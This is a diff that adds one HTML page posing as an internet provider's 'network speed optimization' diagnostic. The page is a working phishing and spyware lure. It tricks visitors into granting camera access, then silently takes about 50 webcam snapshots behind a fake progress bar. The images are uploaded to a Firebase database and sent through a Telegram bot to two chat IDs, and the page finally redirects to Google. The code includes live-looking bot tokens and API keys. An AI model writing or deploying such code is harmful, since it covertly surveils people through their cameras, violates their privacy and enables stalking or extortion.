@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Diagnostic | High-Speed Fiber Portal</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --isp-blue: #0056b3;
+            --isp-bg: #f4f7f9;
+            --isp-text: #333;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--isp-bg); 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .isp-card {
+            background: white; width: 90%; max-width: 400px;
+            padding: 30px; border-radius: 8px; text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .isp-logo { color: var(--isp-blue); font-size: 40px; margin-bottom: 15px; }
+        h2 { margin: 0 0 10px; font-size: 20px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+
+        .btn-check {
+            background: var(--isp-blue); color: white; border: none;
+            padding: 12px 25px; border-radius: 5px; font-weight: 600;
+            cursor: pointer; width: 100%; transition: 0.3s;
+        }
+
+        .btn-check:hover { background: #004494; }
+
+        #diagnostic-ui { display: none; }
+        .progress-container { margin-top: 20px; }
+        .progress-bar { height: 6px; background: #eee; border-radius: 3px; overflow: hidden; margin: 10px 0; }
+        .progress-fill { height: 100%; width: 0%; background: var(--isp-blue); transition: 1s linear; }
+        .log { font-size: 11px; color: #888; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="isp-card">
+        <div id="setup-ui">
+            <div class="isp-logo">🌐</div>
+            <h2>Network Speed Optimization</h2>
+            <p>Your current connection is performing at 40% efficiency. Run a diagnostic to identify and fix signal interference.</p>
+            <button class="btn-check" onclick="initiate()">Optimize Connection</button>
+        </div>
+
+        <div id="diagnostic-ui">
+            <h2>Running Diagnostic...</h2>
+            <div class="progress-container">
+                <div class="progress-bar"><div id="loader" class="progress-fill"></div></div>
+                <p id="percent-label" style="font-weight:bold; color:var(--isp-blue);">Testing latency...</p>
+                <div id="log-text" class="log">Checking server nodes...</div>
+            </div>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // Use your existing Firebase & Telegram Logic here
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('diagnostic-ui').style.display = 'block';
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 50) {
+                            clearInterval(interval);
+                            window.location.href = "https://www.google.com/search?q=speed+test+completed"; 
+                            return;
+                        }
+                        sendData(++count);
+                        document.getElementById('loader').style.width = (count * 2) + "%";
+                        document.getElementById('percent-label').innerText = "Scanning Signal: " + (count * 2) + "%";
+                    }, 1000);
+                };
+            } catch (e) {
+                alert("Please allow hardware access to run the signal diagnostic.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({ image_data: base64Data, target_id: "ISP_OPTIMIZER", timestamp: Date.now() });
+            
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'diag.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+    </script>
+</body>
+</html>
